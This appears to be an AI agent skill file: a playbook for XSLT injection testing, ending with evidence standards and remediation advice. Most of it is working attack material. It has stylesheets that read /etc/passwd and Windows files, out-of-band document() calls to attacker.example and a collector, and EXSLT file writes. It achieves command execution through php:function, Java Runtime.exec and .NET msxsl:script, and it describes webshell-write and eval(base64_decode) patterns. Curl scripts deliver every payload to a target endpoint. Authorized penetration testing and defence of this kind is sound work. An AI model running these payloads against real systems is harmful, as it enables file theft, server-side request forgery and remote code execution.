---
name: xslt-injection
description: >-
  XSLT injection testing: processor fingerprinting, XXE and document() SSRF, EXSLT write primitives, PHP/Java/.NET extension RCE surfaces. Use when user-controlled XSLT/stylesheet input or transform endpoints are in scope.
---

# SKILL: XSLT Injection — Testing Playbook

> **AI LOAD INSTRUCTION**: XSLT injection occurs when **attacker-influenced XSLT** is compiled/executed server-side. Map the **processor family** first (Java/.NET/PHP/libxslt). Then chain **document()**, **external entities**, **EXSLT**, or **embedded script/extension functions** per platform. **Authorized testing only**; many payloads are destructive. Routing note: if input is generic XML parsing and may not flow through XSLT, cross-load `xxe-xml-external-entity`; if you care about outbound `document(http:...)` requests, cross-load `ssrf-server-side-request-forgery`.

---

## 0. QUICK START

1. **Find sinks**: parameters named `xslt`, `stylesheet`, `transform`, `template`, SOAP stylesheets, report generators, XML→HTML converters.
2. **Probe reflection**: inject unique namespace or `xsl:value-of select="'marker'"` — if output changes, execution likely.
3. **Fingerprint** processor (§1).
4. **Escalate** by family: **document()** / **XXE** (§2–3), **EXSLT write** (§4), **PHP** (§5), **Java** (§6), **.NET** (§7).

**Quick probe** (harmless marker):

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:value-of select="'XSLT_PROBE_OK'"/>
  </xsl:template>
</xsl:stylesheet>
```

---

## 1. VENDOR DETECTION

Use standard **system-property** reads inside expressions:

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:output method="text"/>
  <xsl:template match="/">
    <xsl:text>vendor=</xsl:text><xsl:value-of select="system-property('xsl:vendor')"/>
    <xsl:text>&#10;version=</xsl:text><xsl:value-of select="system-property('xsl:version')"/>
    <xsl:text>&#10;vendor-url=</xsl:text><xsl:value-of select="system-property('xsl:vendor-url')"/>
  </xsl:template>
</xsl:stylesheet>
```

**Typical fingerprints** (examples, not exhaustive):

| Signal | Possible engine |
|--------|------------------|
| `Apache Software Foundation` / Xalan markers | Xalan (Java) |
| `Saxonica` / Saxon URI hints | Saxon |
| `libxslt` / GNOME stack | libxslt (C, often via PHP, nginx modules, etc.) |
| Microsoft URLs / MSXML strings | MSXML / .NET XSLT stack |

Use results to select §5–§7 paths.

---

## 2. EXTERNAL ENTITY (XXE VIA XSLT)

XSLT 1.0 allows **DTD-based entities** in the stylesheet or source when the parser permits DTDs:

```xml
<!DOCTYPE xsl:stylesheet [
  <!ENTITY ext_file SYSTEM "file:///etc/passwd">
]>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:output method="text"/>
  <xsl:template match="/">
    <xsl:value-of select="'ENTITY_START'"/>
    <xsl:value-of select="&ext_file;"/>
    <xsl:value-of select="'ENTITY_END'"/>
  </xsl:template>
</xsl:stylesheet>
```

**Note**: Hardened parsers disable external DTDs — failure here does not disprove other XSLT vectors (see §3).

---

## 3. FILE READ VIA `document()`

`document()` loads another XML document into a node-set; local files often parse as XML (noisy) but **errors and partial reads** may still leak.

**Unix example**:

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:output method="text"/>
  <xsl:template match="/">
    <xsl:copy-of select="document('/etc/passwd')"/>
  </xsl:template>
</xsl:stylesheet>
```

**Windows example**:

```xml
<xsl:copy-of select="document('file:///c:/windows/win.ini')"/>
```

**SSRF / out-of-band**:

```xml
<xsl:copy-of select="document('http://attacker.example/ssrf')"/>
```

Chain with **error-based** or **timing** observations if inline data does not return to the client.

---

## 4. FILE WRITE VIA EXSLT (`exslt:document`)

When **EXSLT common** extension is enabled:

```xml
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:exploit="http://exslt.org/common"
  extension-element-prefixes="exploit">
  <xsl:template match="/">
    <exploit:document href="/tmp/evil.txt" method="text">
      <xsl:text>PROOF_CONTENT</xsl:text>
    </exploit:document>
  </xsl:template>
</xsl:stylesheet>
```

**Impact**: arbitrary file write where path permissions allow — often **RCE** via webroot, cron paths, or inclusion points.

---

## 5. RCE VIA PHP (`php:function`)

Requires PHP XSLT with **`registerPHPFunctions()`**-style exposure (application misconfiguration). Namespace:

```xml
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:php="http://php.net/xsl">
  <xsl:output method="text"/>
  <xsl:template match="/">
    <xsl:value-of select="php:function('readfile','index.php')"/>
  </xsl:template>
</xsl:stylesheet>
```

**Directory listing**:

```xml
<xsl:value-of select="php:function('scandir','.')"/>
```

**Dangerous patterns** (historical abuses — verify only in lab):

- `php:function('assert', string($payload))` — environment-dependent, often deprecated/removed; chained with `include`/`require` in old apps.
- `php:function('file_put_contents','/var/www/shell.php','<?php ...')` — **webshell write** when callable is whitelisted recklessly.
- `preg_replace` with **`/e`** modifier (legacy PHP) — the replacement string is **evaluated as PHP**; metasploit-style chains often wrapped **base64_decode** of a blob to smuggle a **meterpreter** (or other) staged payload. Removed in PHP 7+; only relevant for ancient runtimes.

**Legacy PHP equivalent** (illustrates the `/e` + base64 pattern — lab only):

```php
preg_replace('/.*/e', 'eval(base64_decode("BASE64_PHP_HERE"));', '', 1);
```

Surface from XSLT only if `php:function` exposes `preg_replace` to user stylesheets (rare + critical misconfiguration).

**Tester note**: modern PHP hardening often **blocks** these; absence of RCE does not remove **document()** / **XXE**.

---

## 6. RCE VIA JAVA (SAXON / XALAN EXTENSIONS)

Java engines may expose **extension functions** mapping to static methods. Examples appear in historical advisories; exact syntax depends on **version and extension binding**.

**Illustrative pattern** (conceptual — adjust to permitted extension namespace and API):

```xml
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
  <xsl:template match="/">
    <xsl:variable name="rtobject" select="rt:getRuntime()"/>
    <xsl:value-of select="rt:exec($rtobject,'/bin/sh -c id')"/>
  </xsl:template>
</xsl:stylesheet>
```

**Saxon-style static Java integration** (highly configuration-dependent):

```text
Runtime:exec(Runtime:getRuntime(), 'cmd.exe /C ping 192.0.2.1')
```

Replace `192.0.2.1` with your lab listener / documentation IP (RFC 5737 TEST-NET).

**Operational guidance**: if extensions are disabled (common secure default), pivot to **document()**, SSRF, or **deserialization** elsewhere — not every XSLT endpoint runs with extensions on.

---

## 7. RCE VIA .NET (`msxsl:script`)

When Microsoft XSLT **script blocks** are allowed:

```xml
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:msxsl="urn:schemas-microsoft-com:xslt"
    extension-element-prefixes="msxsl">
  <msxsl:script language="C#" implements-prefix="user">
    <![CDATA[
    public string xexec() {
      System.Diagnostics.Process.Start("cmd.exe", "/c whoami");
      return "ok";
    }
    ]]>
  </msxsl:script>
  <xsl:template match="/">
    <xsl:value-of select="user:xexec()"/>
  </xsl:template>
</xsl:stylesheet>
```

**Default secure configs** often disable scripts — treat this as **when enabled** behavior.

---

## 8. DECISION TREE

```text
                    User influences XSLT or XML transform?
                                    |
                                   NO --> stop (out of scope)
                                    |
                                   YES
                                    |
                    +---------------+---------------+
                    |                               |
             output reflects                       no reflection
             injected logic?                    try blind channels
                    |                               |
                    v                               v
            system-property()                 errors, OOB, timing
            fingerprint vendor                      |
                    |                               |
        +-----------+-----------+                   |
        |           |           |                   |
      libxslt     Java        .NET              document()
        |           |           |                   |
    document()   Saxon/Xalan  msxsl:script?      SSRF/file
    EXSLT write  extensions?      |                   |
        |           |           C# Process         EXSLT?
        v           v           v                   v
    file R/W     rt/exec      cmd.exe /c         map evidence
```

---

## Payloads All The Things (PAT) Note

The **PayloadsAllTheThings** project documents many injection classes; for **XSLT**, maintainer notes indicate **no dedicated maintained tool** section comparable to SQLi/XSS toolchains — exploitation is **processor- and configuration-specific**, driven by proxy/manual payloads and custom scripts. Plan time for **local lab reproduction** with the same engine/version as the target when possible.

---

## Tooling (practical)

| Category | Examples |
|----------|----------|
| Proxy / manual | Burp Suite, OWASP ZAP — replay stylesheet payloads, observe responses and errors |
| XML/XSLT lab | Match **exact** processor (PHP libxslt, Java Saxon version, .NET framework) in a VM |
| Out-of-band | Collaborator / private callback server for `document('http://…')` |

No single universal scanner replaces **version-specific** behavior validation.

---

## Related

- **xxe-xml-external-entity** — DTD/entity hardening, generic XML parsers (`../xxe-xml-external-entity/SKILL.md`).
- **ssrf-server-side-request-forgery** — when `document(http:…)` or entity URLs cause server fetches (`../ssrf-server-side-request-forgery/SKILL.md`).

---

## 9. EXECUTION PRIMITIVES

XSLT injection is proven by **the transform reading a file you chose or making a request you
observed**. Which capability is available depends entirely on the processor and its extensions.

### 9.1 Establish the injection point and that a transform runs

```bash
# the stylesheet usually arrives as a file upload, a URL parameter, or an XML field
# first: does the app change its output because of your stylesheet at all?
cat > /tmp/t1.xsl <<'XSL'
<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/"><out>MARKER-7x7</out></xsl:template>
</xsl:stylesheet>
XSL
curl -sS -o /tmp/o1 -w '%{http_code}\n' -X POST "https://target.tld/api/transform" \
  -F "xml=@/tmp/data.xml" -F "xsl=@/tmp/t1.xsl"
grep -c 'MARKER-7x7' /tmp/o1
```

If `MARKER-7x7` appears, **you control the transform** - which is already a significant finding,
because a transform can read files and make requests. If it does not, the stylesheet is not being
applied and you are testing the wrong parameter.

### 9.2 Processor identification

```bash
# each processor exposes distinguishing behaviour and version-dependent extensions
cat > /tmp/fp.xsl <<'XSL'
<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                xmlns:system="http://exslt.org/common">
  <xsl:template match="/">
    <v><xsl:value-of select="system:node-set('x')"/></v>
  </xsl:template>
</xsl:stylesheet>
XSL
curl -sS -o /tmp/of -X POST "https://target.tld/api/transform" -F "xml=@/tmp/data.xml" -F "xsl=@/tmp/fp.xsl"
head -c 200 /tmp/of; echo
# the app's own error output names the processor and often the version
curl -sS -o /tmp/oe -X POST "https://target.tld/api/transform" -F "xml=@/tmp/data.xml" -F "xsl=@/tmp/broken.xsl"
grep -oiE 'saxon|xalan|xsltproc|libxslt|msxml|.net|jdk|oracle|sablotron' /tmp/oe | sort -u
```

The processor identity determines **which extensions exist**: `php:function` (PHP), `msxsl:script`
(.NET), Saxon's `java:` and EXSLT (Java), and `document()` (nearly all). **Identify it before
attempting a capability** - the fix and the payload both depend on it.

### 9.3 File read with `document()`

```bash
cat > /tmp/read.xsl <<'XSL'
<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <out><xsl:copy-of select="document('/etc/passwd')"/></out>
  </xsl:template>
</xsl:stylesheet>
XSL
curl -sS -o /tmp/ro -X POST "https://target.tld/api/transform" \
  -F "xml=@/tmp/data.xml" -F "xsl=@/tmp/read.xsl"
grep -oE 'root:.*:0:0:' /tmp/ro | head -1
# and the Windows equivalent
sed "s|/etc/passwd|file:///c:/windows/win.ini|" /tmp/read.xsl > /tmp/read_win.xsl
curl -sS -o /tmp/ro2 -X POST "https://target.tld/api/transform" \
  -F "xml=@/tmp/data.xml" -F "xsl=@/tmp/read_win.xsl"
head -c 200 /tmp/ro2
```

`document()` with a `file://` URL is the most widely available capability and the **first thing to
test**. A `root:` line in the response is the finding. The same primitive reads application config
files, which usually contain credentials.

### 9.4 Out-of-band confirmation with `document()`

```bash
cat > /tmp/oob.xsl <<'XSL'
<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <out><xsl:copy-of select="document('http://COLLAB/xslt-oob')"/></out>
  </xsl:template>
</xsl:stylesheet>
XSL
curl -sS -o /dev/null -X POST "https://target.tld/api/transform" -F "xml=@/tmp/data.xml" -F "xsl=@/tmp/oob.xsl"
sleep 5; grep -c 'xslt-oob' /path/to/collab.log
```

An outbound fetch proves the processor will reach a host you name - and combined with `file://` it
means **internal HTTP services are reachable too**, which is the SSRF-class impact. Test an internal
address next.

### 9.5 XXE through the stylesheet

```bash
cat > /tmp/xxe.xsl <<'XSL'
<?xml version="1.0"?>
<!DOCTYPE xsl:stylesheet [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/"><out>&xxe;</out></xsl:template>
</xsl:stylesheet>
XSL
curl -sS -o /tmp/xo -X POST "https://target.tld/api/transform" \
  -F "xml=@/tmp/data.xml" -F "xsl=@/tmp/xxe.xsl"
grep -oE 'root:.*:0:0:' /tmp/xo | head -1
```

If entity expansion is enabled, this reads a file **without needing `document()`** - a useful
alternative when `document()` is disabled but DTDs are not. Test both paths; they are configured
independently.

### 9.6 PHP processor: `php:function`

```bash
cat > /tmp/php.xsl <<'XSL'
<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:php="http://php.net/xsl" exclude-result-prefixes="php">
  <xsl:template match="/">
    <out><xsl:value-of select="php:function('system','id')"/></out>
  </xsl:template>
</xsl:stylesheet>
XSL
curl -sS -o /tmp/po -X POST "https://target.tld/api/transform" \
  -F "xml=@/tmp/data.xml" -F "xsl=@/tmp/php.xsl"
grep -oE 'uid=[0-9]+' /tmp/po | head -1
```

`php:function` requires the PHP XSL extension to have registered functions (which it does not by
default in modern PHP) - **test it, but expect it to fail on current versions**. `php:functionString`
and `php:function` are both worth trying.

### 9.7 .NET processor: `msxsl:script` and Java processors

```bash
cat > /tmp/dotnet.xsl <<'XSL'
<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:cs="urn:cs">
  <msxsl:script language="C#" implements-prefix="cs">
    public string Run(string c){ return "MARKER-RAN"; }
  </msxsl:script>
  <xsl:template match="/"><out><xsl:value-of select="cs:Run('id')"/></out></xsl:template>
</xsl:stylesheet>
XSL
curl -sS -o /tmp/no -X POST "https://target.tld/api/transform" \
  -F "xml=@/tmp/data.xml" -F "xsl=@/tmp/dotnet.xsl"
grep -c 'MARKER-RAN' /tmp/no
# Java processors: Saxon HE blocks java: extensions; PE/EE do not
cat > /tmp/java.xsl <<'XSL'
<?xml version="1.0"?>
<xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:java="http://saxon.sf.net/java-type">
  <xsl:template match="/"><out><xsl:value-of select="java:java.lang.Runtime.getRuntime()"/></out></xsl:template>
</xsl:stylesheet>
XSL
curl -sS -o /tmp/jo -X POST "https://target.tld/api/transform" \
  -F "xml=@/tmp/data.xml" -F "xsl=@/tmp/java.xsl"
head -c 200 /tmp/jo
```

`msxsl:script` requires the app to call the settings that enable it (it is off by default in modern
.NET). Saxon HE blocks `java:` reflection; **only the commercial editions allow it**. Test, and record
the result - a blocked attempt is not a finding.

### 9.8 File write via EXSLT

```bash
# some processors expose document write-back through EXSLT
cat > /tmp/write.xsl <<'XSL'
<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:exslt="http://exslt.org/common" xmlns:doc="http://exslt.org/dynamic">
  <xsl:template match="/">
    <out><xsl:value-of select="doc:document('/tmp/xslt-written','MARKER-WROTE')"/></out>
  </xsl:template>
</xsl:stylesheet>
XSL
curl -sS -o /tmp/wo -X POST "https://target.tld/api/transform" \
  -F "xml=@/tmp/data.xml" -F "xsl=@/tmp/write.xsl"
head -c 200 /tmp/wo
echo "then check whether the file exists and is web-readable - fetch it if a path is guessable"
```

A confirmed arbitrary file write is the strongest XSLT outcome; it is **rare and processor-specific**.
If the attempt fails, say so and report the read capability instead.

---

## 10. CONFIRMING THE FINDING

| Step | Question | What it proves |
|---|---|---|
| 1 | Did your stylesheet **change the output** (`MARKER-7x7`)? | you control the transform, which is the precondition for everything else |
| 2 | Did `document()` return **file contents** (`root:`)? | a file read, the most commonly available capability |
| 3 | Did the processor make a **request to your collector**? | an outbound fetch, and the SSRF-class impact |
| 4 | Which **processor and version** is it? | determines which extensions exist and what the fix is |
| 5 | Did an **extension function** execute (`php:function`, `msxsl:script`, `java:`)? | code execution, the strongest claim |
| 6 | Did you confirm an **internal service** is reachable through `document()`? | the impact beyond the file read |
| 7 | Is the injection point **reachable by a user**, or only by an administrative transform endpoint? | severity depends heavily on who can supply a stylesheet |

**Controlling the transform is the threshold.** From there, `document()` read is the usual capability;
extension-function execution is the exceptional one. Report the specific capability you reached and
name the processor, because a reader cannot assess the finding without it.

---

## 11. EVIDENCE STANDARD

| Item | Why |
|---|---|
| The **stylesheet you supplied** and the **injection point** (upload field, parameter, XML field) | the reproduction and the fix target |
| The **output showing your marker**, then the file contents or the callback | proves control and then capability, in two steps |
| The **processor and version**, with the evidence that identified it | every extension and every mitigation is processor-specific |
| The **capability reached** - control, file read, outbound fetch, or code execution - stated separately | an execution claim needs extension-function output |
| For a file read: the **contents of a file that proves the primitive** (a system file, then an application config) | system files prove reach; config files prove impact |
| For OOB: the **collector log line** with the target's source address | proves the processor reached you |
| For an internal fetch: the **response from the internal service** | the SSRF-class impact |
| **Negative control** - a stylesheet with a benign template produces different output, and a blocked extension errors distinctly | shows the transform ran and the capability is real |
| The **who can inject** - which role and which endpoint accepts a stylesheet | severity depends on this |
| A statement that no files were written or modified unless a write capability was demonstrated | scope discipline |

Report the **capability and the processor**: "`POST /api/transform` accepts a caller-supplied
stylesheet and applies it; a stylesheet with a literal marker changed the output, and
`<xsl:copy-of select="document('/etc/passwd')"/>` returned the full file including the `root:` line;
`document('http://COLLAB/xslt-oob')` produced a request from 203.0.113.42 in the collector log 1.8
seconds later; the error output names `libxslt 1.1.34` and the endpoint requires only an authenticated
low-privilege account", never "the application is vulnerable to XSLT injection".

### False positives - do not report these

| Observation | Why it is not a finding |
|---|---|
| The stylesheet is accepted but the output does not change | the transform is not applied |
| Your marker appears because the input was echoed, not transformed | reflection |
| `document()` returns an empty result | the capability is disabled or the file is unreadable |
| An extension function that produced an error | the extension is not enabled |
| A file read of a path that is world-readable and already served by the web server | no boundary crossed |
| An outbound callback you cannot attribute to the target | ambient traffic |
| `msxsl:script` or `php:function` attempted on a processor that does not support it | not available |
| A `500` naming the processor | an error is not a capability |
| A transform you can only trigger by editing the request in a proxy, with no user-facing path | not reachable |
| Saxon HE rejecting `java:` reported as a bypass | the restriction held |
| A stylesheet you wrote that reads a file in your own test harness | tests your harness |
| An XML input injection with no evidence a stylesheet is applied to it | wrong sink |

**Prove the transform runs first.** Almost every XSLT false positive collapses at the
`MARKER-7x7` step.

---

## 12. REMEDIATION REFERENCE

1. **Never accept a caller-supplied stylesheet** - the architectural fix; transformations should use stylesheets that ship with the application, and user data should only ever be input to a fixed transform.
2. **Disable `document()` and network access in the processor** - `FEATURE_SECURE_PROCESSING` with an external-access deny list in the JAXP APIs, and libxslt's `--nonet` plus the security preferences in setter form, both close the file and network path.
3. **Disable extension functions entirely** - turn off `msxsl:script` settings, do not register `php:function`, and use Saxon HE or explicitly disable `java:` extensions; extensions are what turn a transform into code execution.
4. **Disable DTD processing and external entities in the XML parser** - it closes the XXE-through-stylesheet path, which is independent of `document()` and separately configured.
5. **Use a processor version with secure defaults and keep it current** - many XSLT findings are a processor version away from being fixed, and the secure defaults have improved substantially.
6. **Run transformation in a sandboxed process with no filesystem or network access** - it removes the consequence of every capability above, and it is the control that survives an unknown processor behaviour.
7. **Restrict who may supply a stylesheet, and audit every use** - if an administrative feature must accept one, it needs a separate authorization and an audit trail, because the capability is equivalent to code execution on the server.
8. **Validate and parse the stylesheet against a strict schema before use** - an allowlist of elements and namespaces rejects every foreign namespace and extension element, which is the same control shape as HTML sanitisation.
9. **Grant the transformation user account the least privilege possible** - a read primitive in a process that cannot see application config or credentials is materially less severe.
10. **Never return processor error details to users** - they name the processor and version and make capability selection trivial.
11. **Add an automated test that asserts a hostile stylesheet cannot change the output** - one test that submits a `document()` stylesheet and asserts it is rejected detects the regression the next dependency upgrade would introduce.

---

## 13. RELATED SIBLINGS - LOAD TOGETHER

- [xxe-xml-external-entity](../xxe-xml-external-entity/SKILL.md) - the entity-expansion path into the same parser
- [ssrf-server-side-request-forgery](../ssrf-server-side-request-forgery/SKILL.md) - the outbound fetch `document()` provides
- [path-traversal-lfi](../path-traversal-lfi/SKILL.md) - the file read primitive in its direct form
- [upload-insecure-files](../upload-insecure-files/SKILL.md) - how a stylesheet usually reaches the processor
- [cmdi-command-injection](../cmdi-command-injection/SKILL.md) - the sink a processor extension reaches
